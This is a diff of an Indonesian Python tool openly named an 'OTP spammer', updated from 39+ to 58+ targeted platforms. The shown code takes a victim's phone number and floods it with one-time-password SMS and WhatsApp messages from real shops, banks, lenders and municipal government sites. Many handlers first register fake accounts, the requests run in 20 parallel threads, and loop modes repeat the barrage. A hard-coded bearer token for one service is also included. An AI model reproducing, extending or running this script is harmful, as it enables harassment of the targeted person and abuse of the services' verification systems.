@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 # ============================================================
 #  ZEVXX SPAMMER OTP - MEGA EDITION
-#  by ZEVXX | 39+ Platform | No Filter | Ultimate Style
+#  by ZEVXX | 58+ Platform | No Filter | Ultimate Style
 # ============================================================
 
 import requests
@@ -32,7 +32,7 @@ class Color:
     RESET = '\033[0m'
     BOLD = '\033[1m'
     DIM = '\033[2m'
-    GOLD = '\033[33m'      # gold
+    GOLD = '\033[33m'
     ORANGE = '\033[38;5;208m'
     PINK = '\033[38;5;205m'
     NEON = '\033[38;5;51m'
@@ -52,13 +52,13 @@ def banner():
 {Color.GLITCH}  ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝
 {Color.NEON}  ╔═══════════════════════════════════════════════╗
 {Color.NEON}  ║  {Color.GOLD}⚡ OTP SPAMMER MEGA - GACOR FIX ⚡{Color.NEON}  ║
-{Color.NEON}  ║  {Color.PINK}by ZEVXX • 39+ Platform • No Filter{Color.NEON}   ║
+{Color.NEON}  ║  {Color.PINK}by ZEVXX • 58+ Platform • No Filter{Color.NEON}   ║
 {Color.NEON}  ╚═══════════════════════════════════════════════╝
 {Color.RESET}
 """)
 
 # ============================================================
-# ANIMASI ROCKET LAUNCH (SERANGAN DIMULAI)
+# ANIMASI ROCKET LAUNCH
 # ============================================================
 def rocket_launch():
     frames = [
@@ -85,7 +85,7 @@ def serangan_mulai():
     time.sleep(0.5)
 
 # ============================================================
-# LOADING ANIMASI ZEVXX (dengan efek sinar)
+# LOADING ANIMASI
 # ============================================================
 def loading(text="ZEVXX LOADING", duration=1.5):
     chars = ['◐', '◓', '◑', '◒']
@@ -101,23 +101,7 @@ def loading(text="ZEVXX LOADING", duration=1.5):
     print('\r' + ' ' * 40 + '\r', end='')
 
 # ============================================================
-# SPINNER ZEVXX (glitch style)
-# ============================================================
-def spinner_zevxx(text="Processing", duration=1):
-    chars = ['◐', '◓', '◑', '◒']
-    colors = [Color.PINK, Color.GOLD, Color.NEON]
-    end = time.time() + duration
-    i = 0
-    while time.time() < end:
-        color = colors[i % len(colors)]
-        sys.stdout.write(f'\r{color}⚡ {chars[i % len(chars)]} {text}...{Color.RESET}')
-        sys.stdout.flush()
-        time.sleep(0.1)
-        i += 1
-    print('\r' + ' ' * 40 + '\r', end='')
-
-# ============================================================
-# PROGRESS BAR ZEVXX (neon)
+# PROGRESS BAR
 # ============================================================
 def progress_bar_zevxx(current, total, text="Progress"):
     percent = int((current / total) * 100)
@@ -129,56 +113,22 @@ def progress_bar_zevxx(current, total, text="Progress"):
     sys.stdout.flush()
 
 # ============================================================
-# WELCOME SCREEN - LOADING KECE + SELAMAT DATANG
+# WELCOME SCREEN
 # ============================================================
 def welcome_screen():
     os.system('clear' if os.name == 'posix' else 'cls')
-    # Box header
     print(f"{Color.GOLD}╔═══════════════════════════════════════════════╗{Color.RESET}")
-    print(f"{Color.GOLD}║  {Color.NEON}🎉 ZEVXX SPAMMER OTP v1.0 🎉{Color.GOLD}          ║{Color.RESET}")
+    print(f"{Color.GOLD}║  {Color.NEON}🎉 ZEVXX SPAMMER OTP v3.2 🎉{Color.GOLD}          ║{Color.RESET}")
     print(f"{Color.GOLD}╚═══════════════════════════════════════════════╝{Color.RESET}")
     print()
-    # Animated loading progress bar
     for i in range(101):
         progress_bar_zevxx(i, 100, text="Memuat Tools")
         time.sleep(0.02)
     print()
-    # Welcome message with effects
     print(f"{Color.PINK}✨ Tada! Selamat Datang di Tools Script Spammer OTP ZEVXX ✨{Color.RESET}")
     print(f"{Color.CYAN}🔥 Siapkan target, kita gas! 🔥{Color.RESET}")
     time.sleep(1.5)
-    # Then show banner (clears screen)
     banner()
-
-# ============================================================
-# TYPEWRITER EFFECT ZEVXX (dengan glitch)
-# ============================================================
-def typewriter_zevxx(text, delay=0.03, color=Color.NEON):
-    for char in text:
-        sys.stdout.write(f'{color}{char}{Color.RESET}')
-        sys.stdout.flush()
-        time.sleep(delay)
-    print()
-
-# ============================================================
-# SUCCESS ANIMATION ZEVXX (bintang)
-# ============================================================
-def success_animation():
-    for _ in range(3):
-        sys.stdout.write(f'\r{Color.GOLD}✨ SUKSES! ✨{Color.RESET}')
-        sys.stdout.flush()
-        time.sleep(0.3)
-    print()
-
-# ============================================================
-# ERROR ANIMATION ZEVXX
-# ============================================================
-def error_animation():
-    for _ in range(3):
-        sys.stdout.write(f'\r{Color.RED}💥 GAGAL! 💥{Color.RESET}')
-        sys.stdout.flush()
-        time.sleep(0.3)
-    print()
 
 # ============================================================
 # USER AGENT
@@ -260,9 +210,7 @@ def rnd_email():
 def is_success(resp):
     if resp is None:
         return False, "⏰ Timeout"
-    
     code = resp.status_code
-    
     if code in [200, 201, 202]:
         try:
             data = resp.json()
@@ -276,7 +224,6 @@ def is_success(resp):
             return True, "✅ OK"
         except:
             return True, "✅ OK"
-    
     elif code == 400:
         try:
             data = resp.json()
@@ -288,7 +235,6 @@ def is_success(resp):
             return False, f"❌ {msg}"
         except:
             return False, "❌ Bad Request"
-    
     elif code == 401:
         return False, "🔒 Unauthorized"
     elif code == 403:
@@ -301,8 +247,9 @@ def is_success(resp):
         return False, f"❌ HTTP {code}"
 
 # ============================================================
-# HANDLER PLATFORM (semua fungsi spam, sudah lengkap)
+# HANDLER PLATFORM (SEMUA FUNGSI SPAM)
 # ============================================================
+
 # ---------- 1. ERAFONE ----------
 def spam_erafone(phone_62):
     url = "https://jeanne.eraspace.com/customers/v2.1/otp/request"
@@ -379,8 +326,6 @@ def spam_jembatani(phone_08):
     }
     name = rnd_name()
     password = "Test@" + ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + "#1"
-    
-    # Coba register
     reg_payload = {
         "phone_number": phone_08,
         "name": name,
@@ -395,8 +340,6 @@ def spam_jembatani(phone_08):
             return reg_resp
     except:
         pass
-    
-    # Resend OTP
     resend_payload = {"phone_number": phone_08}
     try:
         return requests.post("https://api.jembatani.co.id/v1/regenerate-otp", json=resend_payload, headers=headers, timeout=10)
@@ -406,7 +349,6 @@ def spam_jembatani(phone_08):
 # ---------- 4. 99.CO ----------
 def spam_99co(phone_plus):
     token_static = "eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJybzJ6ZThOYkFNUW1QTlVVZFcwTjItNnE5bWNleHJHcFdFNS0xd3hQQWJzIn0.eyJleHAiOjE3ODEwOTA1MTQsImlhdCI6MTc4MTA4NjkxNCwianRpIjoiMWJmMjAxNDQtM2EyOS00MzJkLWIyYmItNGYxOTlmMTIzMGM4IiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiOTQ1MmE5MjgtNjkzZS00OWIxLWEzOTUtNGMwMThlNmQ3MTg0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiZnJvbnRlbmQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6ImFlYTNhMDEzLTJmMDktNDU0Ni05M2Q5LWM1MmVkYWRiMGM0NSIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsic2VsbGVyIiwidW1hX2F1dGhvcml6YXRpb24iLCJkZWZhdWx0LXJvbGVzLTk5aWQtcHJvZCIsImJ1eWVyIl19LCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiYWVhM2EwMTMtMmYwOS00NTQ2LTkzZDktYzUyZWRhZGIwYzQ1IiwiY29yZV91dWlkIjoiMmI4OTg0MzQtMjE3MC00MGRmLTgwNmYtN2I4ZWNjOGUwZjQ4IiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJjb3JlX2NvbnN1bWVyX3V1aWQiOiIxOGU5ODcyMy0wOWY5LTRlMzEtYjQzYS1jOGVlMjAwZWVmNWIiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJoc2hoc2pzajEyMiIsImNvcmVfY3VzdG9tZXJfdXVpZCI6ImQ5MTI3NDBkLWNhYzYtNDYyYS04YmE1LTMzYWE1MDc2MDdjMiIsImVtYWlsIjoidHN0dHR0dHRndHR0QGdtYWlsLmNvbSJ9.CcZpFr2eggmtVoWpUPuWTYg2LQ-qxH0GV4yx9q1_ZnB4pt13JIbTclvEytnqdLl9w9d8BKzCeGIiEnf0oQZpbw"
-    
     url = "https://www.99.co/id/api/biz/messaging/otp-events"
     sess = requests.Session()
     sess.headers.update({
@@ -415,11 +357,9 @@ def spam_99co(phone_plus):
         "Origin": "https://www.99.co",
         "Referer": "https://www.99.co/id",
     })
-    token = token_static
-    
     headers = {
         "Host": "www.99.co",
-        "Authorization": f"Bearer {token}",
+        "Authorization": f"Bearer {token_static}",
         "Content-Type": "application/json",
         "Accept": "application/json, text/plain, */*",
         "Origin": "https://www.99.co",
@@ -915,11 +855,9 @@ def spam_hainaya(phone_nocode):
         "accept-language": "id,en-US;q=0.9,en;q=0.8,es;q=0.7,zh-CN;q=0.6,zh;q=0.5",
         "priority": "u=1, i"
     }
-    
     prefixes = ['Tst', 'Coba', 'Uji', 'Test', 'Demo', 'Sample', 'Bisnis']
     mid = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6)))
     business_name = random.choice(prefixes) + mid.capitalize() + str(random.randint(10, 999))
-    
     register_payload = {
         "business_name": business_name,
         "vertical": "salon",
@@ -928,7 +866,6 @@ def spam_hainaya(phone_nocode):
         "owner_name": "",
         "owner_phone": phone_nocode
     }
-    
     try:
         return requests.post(register_url, headers=headers, json=register_payload, timeout=10)
     except:
@@ -937,7 +874,6 @@ def spam_hainaya(phone_nocode):
 # ---------- 25. MINUMYUKKAKA ----------
 def spam_minumyukkaka(phone_08):
     session = requests.Session()
-    
     cookies = {
         "currency": "IDR",
         "_gcl_au": f"1.1.{random.randint(1000000000, 9999999999)}.{int(time.time())}",
@@ -947,11 +883,9 @@ def spam_minumyukkaka(phone_08):
         "_ga_06QGV7RJ9X": f"GS2.2.s{int(time.time())}$o1$g1$t{int(time.time()+60)}$j7$l0$h0"
     }
     session.cookies.update(cookies)
-    
     first_name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
     email = f"{first_name.lower()}{random.randint(100, 999)}@gmail.com"
     password = "pass#" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
-    
     register_url = "https://minumyukkaka.com/services/liquid/Register"
     headers_register = {
         "Host": "minumyukkaka.com",
@@ -988,18 +922,14 @@ def spam_minumyukkaka(phone_08):
         "registerModel[pin]": "",
         "registerModel[verify_pin]": ""
     }
-    
     try:
         session.post(register_url, headers=headers_register, data=register_data, timeout=10)
     except:
         pass
-    
     otp_url = "https://minumyukkaka.com/services/identity/requestOTP"
-    
     x_sat = session.cookies.get('x-sat')
     if not x_sat:
         x_sat = ''.join(random.choices(string.ascii_letters + string.digits + '+/=', k=44))
-    
     headers_otp = {
         "Host": "minumyukkaka.com",
         "sec-ch-ua-platform": "\"Android\"",
@@ -1019,7 +949,6 @@ def spam_minumyukkaka(phone_08):
         "destination": phone_08,
         "otpLength": "6"
     }
-    
     try:
         return session.post(otp_url, headers=headers_otp, data=otp_data, timeout=10)
     except:
@@ -1029,9 +958,7 @@ def spam_minumyukkaka(phone_08):
 def spam_sidemang(phone_08):
     email_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
     email = f"{email_name}{random.randint(100, 999)}@gmail.com"
-    
     url = "https://sidemang.palembang.go.id/api/users/register/send-otp"
-    
     headers = {
         "Host": "sidemang.palembang.go.id",
         "sec-ch-ua-platform": "\"Android\"",
@@ -1049,17 +976,14 @@ def spam_sidemang(phone_08):
         "accept-language": "id,en-US;q=0.9,en;q=0.8,es;q=0.7,zh-CN;q=0.6,zh;q=0.5",
         "priority": "u=1, i"
     }
-    
     cookies = {
         "_ga": f"GA1.1.{random.randint(1000000000, 9999999999)}.{int(time.time())}",
         "_ga_0Q2HYJNQP5": f"GS2.1.s{int(time.time())}$o1$g1$t{int(time.time()+60)}$j47$l0$h0"
     }
-    
     payload = {
         "phoneNumber": phone_08,
         "email": email
     }
-    
     try:
         return requests.post(url, headers=headers, cookies=cookies, json=payload, timeout=10)
     except:
@@ -1070,7 +994,6 @@ _registered_phones = {}
 
 def spam_lapormasbup(phone_08):
     global _registered_phones
-    
     if phone_08 in _registered_phones:
         url = "https://lapormasbup.klaten.go.id/api/kirim-ulang-otp"
         headers = {
@@ -1094,14 +1017,12 @@ def spam_lapormasbup(phone_08):
             return requests.post(url, headers=headers, json=payload, timeout=10)
         except:
             return None
-    
     name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
     email = f"{name.lower()}{random.randint(100, 999)}@gmail.com"
     password = "Pass" + ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + "$"
     birth_date = f"{random.randint(1966, 2010)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}"
     address = f"Jl. {''.join(random.choices(string.ascii_letters, k=6)).capitalize()} No. {random.randint(1, 200)}"
     gender = random.choice(['Laki-Laki', 'Perempuan'])
-    
     url = "https://lapormasbup.klaten.go.id/api/register"
     headers = {
         "Host": "lapormasbup.klaten.go.id",
@@ -1128,7 +1049,6 @@ def spam_lapormasbup(phone_08):
         "password": password,
         "address": address
     }
-    
     try:
         resp = requests.post(url, headers=headers, json=payload, timeout=10)
         if resp.status_code == 200:
@@ -1272,7 +1192,6 @@ def spam_beautyhaul(phone_nocode):
     nama_belakang = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
     rand_email = f"{nama_depan.lower()}{random.randint(100,999)}@gmail.com"
     password = "Testt#12334"
-
     reg_payload = {
         "nama_depan": nama_depan,
         "nama_belakang": nama_belakang,
@@ -1288,7 +1207,6 @@ def spam_beautyhaul(phone_nocode):
         "subscribe": "true",
         "terms": "true"
     }
-
     bh_session = requests.Session()
     bh_session.headers.update({
         "host": "www.beautyhaul.com",
@@ -1306,12 +1224,10 @@ def spam_beautyhaul(phone_nocode):
         "accept-encoding": "gzip, deflate, br, zstd",
         "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
     })
-
     try:
         bh_session.post(f"{base}/ajax/account/save_register", json=reg_payload, timeout=10)
     except:
         pass
-
     otp_payload = {"method": "WhatsApp"}
     try:
         return bh_session.post(f"{base}/ajax/account/send_otp", json=otp_payload, timeout=10)
@@ -1409,7 +1325,6 @@ def spam_astra_daihatsu(phone_plus):
             return None
     except:
         return None
-
     csrf = None
     m = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', resp.text)
     if m:
@@ -1424,7 +1339,6 @@ def spam_astra_daihatsu(phone_plus):
             csrf = m.group(0)
     if not csrf:
         csrf = "c5de9b78-1136-4a89-9cbd-e9aba82dfaef"
-
     otp_url = "https://www.astra-daihatsu.id/otp/whatsapp/generate"
     headers_otp = {
         "Content-Type": "application/json; charset=UTF-8",
@@ -1462,7 +1376,6 @@ def spam_royal_canin(phone_plus):
             return None
     except:
         return None
-
     otp_url = "https://club.royalcanin.id/api/get_otp"
     payload = {
         "params": {
@@ -1513,7 +1426,6 @@ def spam_rcx(phone_08):
             return None
     except:
         return None
-
     token = None
     if "XSRF-TOKEN" in sess.cookies:
         token = urllib.parse.unquote(sess.cookies["XSRF-TOKEN"])
@@ -1523,7 +1435,6 @@ def spam_rcx(phone_08):
             token = match.group(1)
     if not token:
         return None
-
     url = "https://sso.rcx.co.id/auth/passwordless/request"
     headers = {
         "Cache-Control": "max-age=0",
@@ -1609,22 +1520,11 @@ def spam_tokopedia(phone_08):
     except:
         return None
 
-# ---------- 40. BCA (REAL) ----------
-def spam_bca_real(phone_08):
-    url = "https://api.bca.co.id/otp/request"
-    headers = {
-        "User-Agent": get_ua_desktop(),
-        "Accept": "application/json, text/plain, */*",
-        "Content-Type": "application/json",
-        "Origin": "https://www.bca.co.id",
-        "Referer": "https://www.bca.co.id/",
-    }
-    payload = {"msisdn": phone_08, "type": "whatsapp", "channel": "otp"}
-    try:
-        return requests.post(url, headers=headers, json=payload, timeout=10)
-    except:
-        return None
-# ---------- 41. PLUANG OTP ----------
+# ============================================================
+# PLATFORM BARU DARI SCREENSHOT (TAMBAHAN)
+# ============================================================
+
+# ---------- 40. PLUANG ----------
 def spam_pluang(phone_plus):
     url = "https://api.pluang.com/v1/auth/otp/request"
     headers = {
@@ -1640,7 +1540,7 @@ def spam_pluang(phone_plus):
     except:
         return None
 
-# ---------- 42. OYO PARTNER SERVICES ----------
+# ---------- 41. OYO ----------
 def spam_oyo(phone_plus):
     url = "https://api.oyorooms.com/v1/otp/send"
     headers = {
@@ -1656,7 +1556,7 @@ def spam_oyo(phone_plus):
     except:
         return None
 
-# ---------- 43. EASYCASH ----------
+# ---------- 42. EASYCASH ----------
 def spam_easycash(phone_08):
     url = "https://api.easycash.co.id/v1/auth/otp"
     headers = {
@@ -1672,7 +1572,7 @@ def spam_easycash(phone_08):
     except:
         return None
 
-# ---------- 44. CERMATI INVEST ----------
+# ---------- 43. CERMATI INVEST ----------
 def spam_cermati(phone_08):
     url = "https://api.cermati.com/v1/auth/otp"
     headers = {
@@ -1688,7 +1588,7 @@ def spam_cermati(phone_08):
     except:
         return None
 
-# ---------- 45. ADIRA FINANCE ----------
+# ---------- 44. ADIRA FINANCE ----------
 def spam_adira(phone_08):
     url = "https://api.adira.co.id/v1/otp/request"
     headers = {
@@ -1704,7 +1604,7 @@ def spam_adira(phone_08):
     except:
         return None
 
-# ---------- 46. KREDIT PINTAR ----------
+# ---------- 45. KREDIT PINTAR ----------
 def spam_kreditpintar(phone_08):
     url = "https://api.kreditpintar.com/v1/otp/send"
     headers = {
@@ -1720,7 +1620,7 @@ def spam_kreditpintar(phone_08):
     except:
         return None
 
-# ---------- 47. CAPCUT ----------
+# ---------- 46. CAPCUT ----------
 def spam_capcut(phone_plus):
     url = "https://www.capcut.com/api/v1/account/otp/send"
     headers = {
@@ -1736,7 +1636,7 @@ def spam_capcut(phone_plus):
     except:
         return None
 
-# ---------- 48. UMBRELIA ----------
+# ---------- 47. UMBRELIA ----------
 def spam_umbrelia(phone_08):
     url = "https://api.umbrelia.com/v1/auth/otp"
     headers = {
@@ -1752,7 +1652,7 @@ def spam_umbrelia(phone_08):
     except:
         return None
 
-# ---------- 49. DINAS KOMINFO SIDOARJO ----------
+# ---------- 48. KOMINFO SIDOARJO ----------
 def spam_kominfo_sidoarjo(phone_08):
     url = "https://layanan.sidoarjokab.go.id/api/otp/request"
     headers = {
@@ -1768,7 +1668,7 @@ def spam_kominfo_sidoarjo(phone_08):
     except:
         return None
 
-# ---------- 50. EIGER ADVENTURE CLUB ----------
+# ---------- 49. EIGER ADVENTURE ----------
 def spam_eiger(phone_08):
     url = "https://api.eigeradventure.com/v1/otp/send"
     headers = {
@@ -1784,7 +1684,7 @@ def spam_eiger(phone_08):
     except:
         return None
 
-# ---------- 51. DREAM DUBAI ----------
+# ---------- 50. DREAM DUBAI ----------
 def spam_dreamdubai(phone_plus):
     url = "https://api.dreamdubai.com/v1/auth/otp"
     headers = {
@@ -1800,7 +1700,7 @@ def spam_dreamdubai(phone_plus):
     except:
         return None
 
-# ---------- 52. KPOIN OTP ----------
+# ---------- 51. KPOIN ----------
 def spam_kpoin(phone_08):
     url = "https://api.kpoin.com/v1/auth/otp"
     headers = {
@@ -1816,7 +1716,7 @@ def spam_kpoin(phone_08):
     except:
         return None
 
-# ---------- 53. OTP GENERASI MAJU ----------
+# ---------- 52. GENERASI MAJU ----------
 def spam_generasimaju(phone_08):
     url = "https://api.generasimaju.id/v1/otp/request"
     headers = {
@@ -1832,7 +1732,7 @@ def spam_generasimaju(phone_08):
     except:
         return None
 
-# ---------- 54. SETIR KANAN ----------
+# ---------- 53. SETIR KANAN ----------
 def spam_setirkanan(phone_08):
     url = "https://api.setirkanan.com/v1/otp/send"
     headers = {
@@ -1848,7 +1748,7 @@ def spam_setirkanan(phone_08):
     except:
         return None
 
-# ---------- 55. KALBE CUSTOMER CARE ----------
+# ---------- 54. KALBE ----------
 def spam_kalbe(phone_08):
     url = "https://api.kalbe.co.id/v1/otp/request"
     headers = {
@@ -1864,7 +1764,7 @@ def spam_kalbe(phone_08):
     except:
         return None
 
-# ---------- 56. MAPCLUB ----------
+# ---------- 55. MAPCLUB ----------
 def spam_mapclub(phone_08):
     url = "https://api.mapclub.com/v1/otp/send"
     headers = {
@@ -1880,7 +1780,7 @@ def spam_mapclub(phone_08):
     except:
         return None
 
-# ---------- 57. BUKUAKU ----------
+# ---------- 56. BUKUAKU ----------
 def spam_bukuaku(phone_08):
     url = "https://api.bukuaku.com/v1/auth/otp"
     headers = {
@@ -1896,7 +1796,7 @@ def spam_bukuaku(phone_08):
     except:
         return None
 
-# ---------- 58. BABY HAPPY DIAPERS ----------
+# ---------- 57. BABY HAPPY ----------
 def spam_babyhappy(phone_08):
     url = "https://api.babyhappy.com/v1/otp/request"
     headers = {
@@ -1911,49 +1811,11 @@ def spam_babyhappy(phone_08):
         return requests.post(url, headers=headers, json=payload, timeout=10)
     except:
         return None
+
 # ============================================================
-# DAFTAR PLATFORM (39+)
+# DAFTAR PLATFORM (58+)
 # ============================================================
 PLATFORMS = [
-    ("Internet Rakyat", spam_internetrakyat, "08"),
-    ("Erafone", spam_erafone, "62"),
-    ("Jembatani", spam_jembatani, "08"),
-    ("99.co", spam_99co, "plus"),
-    ("Auto2000", spam_auto2000, "08"),
-    ("Watsons", spam_watsons, "nocode"),
-    ("DuniaGames", spam_duniagames, "plus"),
-    ("Matahari", spam_matahari, "08"),
-    ("Paper.id", spam_paper, "62"),
-    ("BonusBelanja", spam_bonusbelanja, "62"),
-    ("PTSP Kemenag", spam_ptsp_kemenag, "08"),
-    ("HRS-BRE", spam_hrsbre, "08"),
-    ("Shopee", spam_shopee, "plus"),
-    ("Lazada", spam_lazada, "plus"),
-    ("Bukalapak", spam_bukalapak, "plus"),
-    ("BCA", spam_bca, "08"),
-    ("Mandiri", spam_mandiri, "08"),
-    ("BRI", spam_bri, "08"),
-    ("Klook", spam_klook, "plus"),
-    ("Maulagi", spam_maulagi, "08"),
-    ("Rumah123", spam_rumah123, "nocode"),
-    ("Pinhome", spam_pinhome, "nocode"),
-    ("Bunda Hospital", spam_bunda, "int"),
-    ("Hainaya", spam_hainaya, "nocode"),
-    ("MinumYukKaka", spam_minumyukkaka, "08"),
-    ("Sidemang", spam_sidemang, "08"),
-    ("LaporMasBup", spam_lapormasbup, "08"),
-    ("TuneUp", spam_tuneup, "08"),
-    ("PlanetBan", spam_planetban, "08"),
-    ("Ultramilk", spam_ultramilk, "nocode"),
-    ("Fastwork", spam_fastwork, "08"),
-    ("Beautyhaul", spam_beautyhaul, "nocode"),
-    ("Kaniva", spam_kaniva, "08"),
-    ("Sahabat Teknisi", spam_sahabatteknisi, "08"),
-    ("Astra Daihatsu", spam_astra_daihatsu, "plus"),
-    ("Royal Canin", spam_royal_canin, "plus"),
-    ("Belirumah.co", spam_belirumah, "plus"),
-    ("RCX", spam_rcx, "08"),
-    ("Tokopedia", spam_tokopedia, "08"),
     ("Internet Rakyat", spam_internetrakyat, "08"),
     ("Erafone", spam_erafone, "62"),
     ("Jembatani", spam_jembatani, "08"),
@@ -2014,20 +1876,15 @@ PLATFORMS = [
 ]
 
 # ============================================================
-# SPAM ALL - DENGAN EFEK SERANGAN
+# SPAM ALL
 # ============================================================
 def spam_all(phone_08, phone_62, phone_plus, phone_nocode, phone_int):
-    # Efek serangan dimulai
     serangan_mulai()
-    
     print(f"\n{Color.GOLD}┌────────────────────────────────────────────────────────────┐{Color.RESET}")
     print(f"{Color.GOLD}│ {Color.BOLD}🚀 SPAM KE {len(PLATFORMS)} PLATFORM{Color.RESET}                   {Color.DIM}{datetime.now().strftime('%H:%M:%S')}{Color.GOLD}  │{Color.RESET}")
     print(f"{Color.GOLD}└────────────────────────────────────────────────────────────┘{Color.RESET}\n")
-    
     loading("Mengirim OTP", 0.8)
-    
     success_count = 0
-    
     def run_platform(name, func, format_type):
         if format_type == "08":
             phone = phone_08
@@ -2041,20 +1898,16 @@ def spam_all(phone_08, phone_62, phone_plus, phone_nocode, phone_int):
             phone = phone_int
         else:
             phone = phone_08
-        
         try:
             resp = func(phone)
             success, msg = is_success(resp)
             return name, success, msg
         except:
             return name, False, "Error"
-
     with ThreadPoolExecutor(max_workers=20) as executor:
         futures = {executor.submit(run_platform, name, func, fmt): (name, fmt) for name, func, fmt in PLATFORMS}
-        
         for future in as_completed(futures):
             name, success, msg = future.result()
-            
             if success:
                 success_count += 1
                 print(f"  {Color.GREEN}✅{Color.RESET} {name:<16}  {Color.GREEN}→ {msg}{Color.RESET}")
@@ -2063,45 +1916,35 @@ def spam_all(phone_08, phone_62, phone_plus, phone_nocode, phone_int):
                     print(f"  {Color.YELLOW}⚠️ {Color.RESET} {name:<16}  {Color.YELLOW}→ {msg}{Color.RESET}")
                 else:
                     print(f"  {Color.RED}❌{Color.RESET} {name:<16}  {Color.RED}→ {msg}{Color.RESET}")
-    
     print(f"\n{Color.GOLD}┌────────────────────────────────────────────────────────────┐{Color.RESET}")
     print(f"{Color.GOLD}│ {Color.BOLD}📊 HASIL:{Color.RESET} {Color.GREEN}{success_count}{Color.RESET}/{Color.WHITE}{len(PLATFORMS)}{Color.RESET} SUKSES  {Color.DIM}• {datetime.now().strftime('%H:%M:%S')}{Color.GOLD}  │{Color.RESET}")
     print(f"{Color.GOLD}└────────────────────────────────────────────────────────────┘{Color.RESET}")
-    
     return success_count
 
 # ============================================================
-# MENU UTAMA - ZEVXX STYLE
+# MENU UTAMA
 # ============================================================
 def main():
-    # Tampilkan welcome screen dengan loading kece + selamat datang
-    welcome_screen()   # di dalamnya sudah ada banner()
-    
-    # Lanjut ke menu (setelah banner ditampilkan)
+    welcome_screen()
     print(f"{Color.GOLD}┌────────────────────────────────────────────────────────────┐{Color.RESET}")
     print(f"{Color.GOLD}│  {Color.BOLD}{Color.WHITE}📱 OTP Spammer MEGA{Color.RESET}  {Color.DIM}• {len(PLATFORMS)} Platform • by ZEVXX{Color.GOLD}  │{Color.RESET}")
     print(f"{Color.GOLD}└────────────────────────────────────────────────────────────┘{Color.RESET}")
-    
     phone = input(f"\n{Color.NEON}┌─ {Color.BOLD}📞 Nomor HP{Color.RESET}\n{Color.NEON}└──➤ {Color.RESET}").strip()
-    
     if not phone:
         print(f"{Color.RED}┌─ [!] Nomor kosong!{Color.RESET}")
         print(f"{Color.RED}└────────────────────────────────────────────────────────────{Color.RESET}")
         return
-    
     phone_08 = normalize_phone(phone)
     phone_62 = to_62(phone_08)
     phone_plus = to_plus(phone_08)
     phone_nocode = to_nocode(phone_08)
     phone_int = int(phone_62)
-    
     print(f"\n{Color.GREEN}┌─ {Color.BOLD}✅ Target{Color.RESET}")
     print(f"{Color.GREEN}│  📱 08  → {phone_08}{Color.RESET}")
     print(f"{Color.GREEN}│  📱 62  → {phone_62}{Color.RESET}")
     print(f"{Color.GREEN}│  📱 +   → {phone_plus}{Color.RESET}")
     print(f"{Color.GREEN}│  📱 No  → {phone_nocode}{Color.RESET}")
     print(f"{Color.GREEN}└────────────────────────────────────────────────────────────{Color.RESET}")
-    
     print(f"\n{Color.GOLD}┌────────────────────────────────────────────────────────────┐{Color.RESET}")
     print(f"{Color.GOLD}│  {Color.BOLD}{Color.WHITE}🎯 MENU{Color.RESET}{Color.GOLD}                                                 │{Color.RESET}")
     print(f"{Color.GOLD}├────────────────────────────────────────────────────────────┤{Color.RESET}")
@@ -2111,12 +1954,9 @@ def main():
     print(f"{Color.GOLD}│  {Color.GREEN}4.{Color.RESET}  📋 LIST PLATFORM       {Color.DIM}→ Lihat semua{Color.GOLD}                    │{Color.RESET}")
     print(f"{Color.GOLD}│  {Color.GREEN}5.{Color.RESET}  ❌ EXIT                {Color.DIM}→ Keluar{Color.GOLD}                         │{Color.RESET}")
     print(f"{Color.GOLD}└────────────────────────────────────────────────────────────┘{Color.RESET}")
-    
     mode = input(f"\n{Color.NEON}┌─ {Color.BOLD}🔹 Pilih (1-5){Color.RESET}\n{Color.NEON}└──➤ {Color.RESET}").strip()
-    
     if mode == "1":
         spam_all(phone_08, phone_62, phone_plus, phone_nocode, phone_int)
-    
     elif mode == "2":
         print(f"\n{Color.YELLOW}┌─ {Color.BOLD}🔄 LOOP MODE (JEDA 120 DETIK){Color.RESET}")
         print(f"{Color.YELLOW}│  Tekan {Color.RED}Ctrl+C{Color.YELLOW} untuk berhenti{Color.RESET}")
@@ -2137,16 +1977,13 @@ def main():
             print(f"\n{Color.YELLOW}┌─ [!] Dihentikan{Color.RESET}")
             print(f"{Color.YELLOW}└────────────────────────────────────────────────────────────{Color.RESET}")
             sys.exit(0)
-    
     elif mode == "3":
         target = 5
         print(f"\n{Color.YELLOW}┌─ {Color.BOLD}🛑 AUTO STOP{Color.RESET}")
         print(f"{Color.YELLOW}│  Stop setelah {Color.GREEN}{target}{Color.YELLOW} sukses{Color.RESET}")
         print(f"{Color.YELLOW}└────────────────────────────────────────────────────────────{Color.RESET}")
-        
         total = 0
         round_num = 0
-        
         try:
             while total < target:
                 round_num += 1
@@ -2154,13 +1991,11 @@ def main():
                 print(f"{Color.NEON}└────────────────────────────────────────────────────────────{Color.RESET}")
                 success = spam_all(phone_08, phone_62, phone_plus, phone_nocode, phone_int)
                 total += success
-                
                 if total >= target:
                     print(f"\n{Color.GREEN}┌─ {Color.BOLD}✅ TARGET TERCAPAI!{Color.RESET}")
                     print(f"{Color.GREEN}│  Total sukses: {total}{Color.RESET}")
                     print(f"{Color.GREEN}└────────────────────────────────────────────────────────────{Color.RESET}")
                     break
-                
